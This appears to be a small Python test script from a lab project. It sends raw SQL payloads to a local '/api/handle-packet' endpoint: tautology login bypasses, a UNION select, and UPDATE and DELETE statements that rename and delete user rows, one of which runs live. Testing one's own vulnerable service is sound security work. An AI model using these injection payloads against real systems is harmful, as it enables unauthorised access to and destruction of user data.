import requests
url = "http://localhost:8001/api/handle-packet"

def execute_sql_injection(payload):
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        try:
            result = response.json()
            print(f"Payload executed successfully: {payload}")
            print(f"Result: {result}")
        except ValueError:
            print(f"Failed to parse JSON response for payload: {payload}")
            print(f"Response: {response.text}")
    else:
        print(f"Failed to execute payload: {payload}")
        print(f"Error: {response.text}")

if __name__ == "__main__":
    # execute_sql_injection("SELECT * FROM users WHERE username = 'ido_1' AND password = 'password';")
    # execute_sql_injection("SELECT username, password FROM users UNION SELECT 'a', 'b';")
    # execute_sql_injection("SELECT * FROM users WHERE username = '' OR '1'='1';")
    # execute_sql_injection("SELECT * FROM users WHERE username = '' OR 1=1 --;")
    # execute_sql_injection("SELECT * FROM users WHERE username = '' OR 'a'='a';")
    # execute_sql_injection("SELECT * FROM users WHERE username = '' OR ''='';")
    # execute_sql_injection("UPDATE users SET username = 'ido_1--' WHERE username = 'ido_1';")
    # execute_sql_injection("UPDATE users SET username = 'adil2' WHERE username = 'adil2';")
    # execute_sql_injection("UPDATE users SET username = 'noy_r1--' WHERE username = 'noy_r1';")
    # execute_sql_injection("DELETE FROM users WHERE username = 'noy_r1--';")
        execute_sql_injection("DELETE FROM users WHERE username = 'ido_1--';")